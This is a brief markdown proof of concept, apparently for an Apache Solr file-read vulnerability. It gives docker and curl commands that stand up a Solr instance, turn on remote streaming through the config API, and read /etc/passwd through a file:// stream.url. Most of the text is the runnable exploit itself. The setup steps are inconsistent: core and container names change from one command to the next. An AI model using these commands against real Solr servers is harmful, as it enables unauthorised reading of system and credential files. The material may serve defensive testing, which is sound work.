#Apache Solr 0-day

## Hacked by: https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ 
## References: https://solr.apache.org/guide/8_8/requestdispatcher-in-solrconfig.html

```
# stand up test on docker
docker run --name solrbear -d -p 8983:8983 -t solr
docker start solrbear
docker exec -it --user solr first_solr bin/solr create_core -c checkcorea

# push some data
curl -X POST -d '{"add":{ "doc":{"id":"delete.me","title":"change.me"}}}' -H "Content-Type: application/json" http://localhost:8983/solr/checkcorea/update?commit=true

# reload
curl -X POST http://localhost:8983/solr/admin/cores?core=first_core&action=RELOAD

# Enable remote stream
TARGET="localhost:8983"
curl -d '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://$TARGET/solr/movie/config -H 'Content-type:application/json'

# Exploit

curl "http://$TARGET/solr/movie/debug/dump?param=ContentStreams" -F "stream.url=file:///etc/passwd"

```

